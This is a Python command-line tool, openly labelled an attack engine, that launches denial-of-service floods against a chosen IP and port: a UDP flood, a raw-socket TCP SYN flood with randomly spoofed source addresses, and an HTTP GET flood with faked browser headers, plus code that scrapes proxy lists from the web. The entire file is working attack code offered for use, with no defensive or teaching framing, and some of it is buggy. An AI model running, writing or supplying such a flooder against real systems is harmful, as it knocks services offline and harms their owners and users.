#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ZETA ULTIMATE - Hybrid UDP/HTTP/TCP Flood (Light Edition)
Author: Zo (Alpha's Command)
"""

import sys
import os
import time
import random
import socket
import threading
import struct
import re
import argparse
from datetime import datetime

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# =========================================================
# CONFIGURATION & GLOBALS
# =========================================================
stop_event = threading.Event()
total_sent = 0
lock = threading.Lock()
attack_active = False

# =========================================================
# 1. UDP FLOOD (Fastest)
# =========================================================
def udp_flood(target_ip, target_port, pps_target, duration, packet_size, worker_id):
    """Pure UDP flood with random payloads."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)
    sock.setblocking(False)
    end_time = time.time() + duration if duration > 0 else float('inf')
    sent = 0
    last_log = time.time()
    
    while not stop_event.is_set() and time.time() < end_time:
        try:
            sock.sendto(os.urandom(packet_size), (target_ip, target_port))
            sent += 1
        except BlockingIOError:
            time.sleep(0.0001)
        except:
            pass
        
        if time.time() - last_log > 5 and sent > 0:
            print(f"[UDP-W{worker_id}] Rate: {int(sent/5)} pps")
            last_log = time.time()
    
    sock.close()
    with lock:
        total_sent += sent
    return sent

# =========================================================
# 2. TCP SYN FLOOD (Simulated via raw socket - requires root/admin)
# =========================================================
def tcp_syn_flood(target_ip, target_port, pps_target, duration, worker_id):
    """Send raw TCP SYN packets to exhaust connection table."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print(f"[SYN-W{worker_id}] Permission denied. Run as root/admin.")
        return
    except:
        return

    end_time = time.time() + duration if duration > 0 else float('inf')
    sent = 0
    src_ip = ".".join(str(random.randint(1,255)) for _ in range(4))
    
    while not stop_event.is_set() and time.time() < end_time:
        try:
            src_ip = ".".join(str(random.randint(1,255)) for _ in range(4))
            # IP Header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                69, 0, 40, 0, 0, 64, socket.IPPROTO_TCP, 0,
                socket.inet_aton(src_ip), socket.inet_aton(target_ip))
            # TCP Header (SYN flag = 80)
            tcp_header = struct.pack('!HHLLBBHHH',
                random.randint(1024,65535), target_port,
                random.randint(1000,9999), 0, 80, 2, 0, 0, 0)
            sock.sendto(ip_header + tcp_header, (target_ip, 0))
            sent += 1
        except:
            pass
    sock.close()
    with lock:
        total_sent += sent
    return sent

# =========================================================
# 3. HTTP GET FLOOD (Layer 7)
# =========================================================
def http_get_flood(target_ip, target_port, pps_target, duration, worker_id):
    """Simple HTTP GET flood with fake headers."""
    end_time = time.time() + duration if duration > 0 else float('inf')
    sent = 0
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    
    while not stop_event.is_set() and time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            ua = random.choice(user_agents)
            req = f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\nConnection: close\r\n\r\n"
            sock.send(req.encode())
            sock.close()
            sent += 1
        except:
            pass
    with lock:
        total_sent += sent
    return sent

# =========================================================
# 4. LOAD PROXIES (from web or file)
# =========================================================
PROXY_POOL = []
def load_proxies_from_web():
    """Fetch proxy IPs from web sources."""
    global PROXY_POOL
    print("[*] Fetching proxy IPs...")
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://www.us-proxy.org/"
    ]
    all_ips = []
    for url in urls:
        try:
            if REQUESTS_AVAILABLE:
                resp = requests.get(url, timeout=10)
                ips = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", resp.text)
                all_ips.extend(ips)
        except:
            pass
    PROXY_POOL = list(set(all_ips))
    print(f"[+] Fetched {len(PROXY_POOL)} unique IPs.")
    return PROXY_POOL

def load_proxies_from_file(file_path):
    global PROXY_POOL
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            ips = [line.strip() for line in f if line.strip()]
        PROXY_POOL = ips
        print(f"[+] Loaded {len(PROXY_POOL)} IPs from {file_path}")
    else:
        print("[!] Proxy file not found.")

# =========================================================
# 5. WORKER DISPATCHER
# =========================================================
def start_attack(args):
    global stop_event, total_sent, attack_active
    stop_event.clear()
    attack_active = True
    total_sent = 0

    target_ip = args.ip
    target_port = args.port
    threads = args.threads
    pps = args.pps
    duration = args.duration
    size = args.size

    print(f"\n[+] TARGET: {target_ip}:{target_port}")
    print(f"[+] THREADS: {threads} | PPS: {pps} | DURATION: {duration}s")
    print("[+] MODE: " + ("UDP" if args.mode == "udp" else "SYN" if args.mode == "syn" else "HTTP"))

    workers = []
    pps_per = max(100, pps // threads)

    for i in range(threads):
        if args.mode == "udp":
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, pps_per, duration, size, i))
        elif args.mode == "syn":
            t = threading.Thread(target=tcp_syn_flood, args=(target_ip, target_port, pps_per, duration, i))
        else:
            t = threading.Thread(target=http_get_flood, args=(target_ip, target_port, pps_per, duration, i))
        t.daemon = True
        t.start()
        workers.append(t)

    # Monitor
    start_time = time.time()
    try:
        while attack_active and not stop_event.is_set():
            time.sleep(2)
            elapsed = time.time() - start_time
            with lock:
                current = total_sent
            rate = int(current / elapsed) if elapsed > 0 else 0
            print(f"[STATUS] Packets: {current} | PPS: {rate} | Time: {int(elapsed)}s")
            if duration > 0 and elapsed >= duration:
                print("[!] Time limit reached.")
                stop_event.set()
                break
    except KeyboardInterrupt:
        print("[!] Stopped by user.")
        stop_event.set()

    for t in workers:
        t.join(timeout=1)
    
    attack_active = False
    elapsed = time.time() - start_time
    print(f"\n[+] FINAL: {total_sent} packets sent in {int(elapsed)}s. Avg: {int(total_sent/elapsed) if elapsed>0 else 0} pps.")

# =========================================================
# 6. MAIN (CLI)
# =========================================================
def main():
    parser = argparse.ArgumentParser(description="ZETA ULTIMATE ATTACK TOOL")
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", type=int, required=True, help="Target Port")
    parser.add_argument("--mode", choices=["udp", "syn", "http"], default="udp", help="Attack Mode")
    parser.add_argument("--threads", type=int, default=4, help="Threads (Default: 4)")
    parser.add_argument("--pps", type=int, default=5000, help="Packets Per Second")
    parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
    parser.add_argument("--size", type=int, default=1024, help="Packet size (UDP only)")
    parser.add_argument("--proxies", type=str, help="File with proxy IPs (for spoofing in future)")
    
    args = parser.parse_args()
    
    print("="*60)
    print("  🔥 ZETA ULTIMATE ATTACK ENGINE 🔥")
    print("  Author: Zo (Alpha's Command)")
    print("="*60)
    
    # If proxies file is provided, load them (just for future use)
    if args.proxies:
        load_proxies_from_file(args.proxies)
    else:
        print("[*] No proxy file. Using direct IP.")
    
    start_attack(args)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        # Interactive mode fallback
        print("Running in Interactive mode...")
        ip = input("Target IP: ")
        port = int(input("Target Port: "))
        mode = input("Mode (udp/syn/http): ").lower() or "udp"
        threads = int(input("Threads (default 4): ") or 4)
        pps = int(input("PPS (default 5000): ") or 5000)
        duration = int(input("Duration (s, default 60): ") or 60)
        size = int(input("Packet size (default 1024): ") or 1024)
        
        class Dummy: pass
        args = Dummy()
        args.ip = ip; args.port = port; args.mode = mode; args.threads = threads
        args.pps = pps; args.duration = duration; args.size = size; args.proxies = None
        main()
    else:
        main()